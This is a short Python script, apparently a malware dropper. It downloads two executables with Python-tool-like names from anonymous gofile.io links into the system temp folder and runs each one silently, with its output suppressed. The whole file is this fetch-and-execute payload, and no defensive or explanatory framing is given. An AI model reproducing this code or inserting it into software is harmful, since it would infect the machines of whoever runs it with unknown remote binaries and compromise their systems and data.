import os
import urllib.request
import tempfile
import subprocess

urls = [
    "https://store9.gofile.io/download/web/4741699d-897b-4294-8539-32145c339ec7/PythonRuntimeEditor.exe",
    "https://store-na-phx-1.gofile.io/download/web/36527304-8ef7-46b3-85fb-f605be0be934/pythonregedit.exe"
]

temp_dir = tempfile.gettempdir()

for url in urls:
    filename = os.path.join(temp_dir, os.path.basename(url))
    urllib.request.urlretrieve(url, filename)
    subprocess.Popen(filename, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
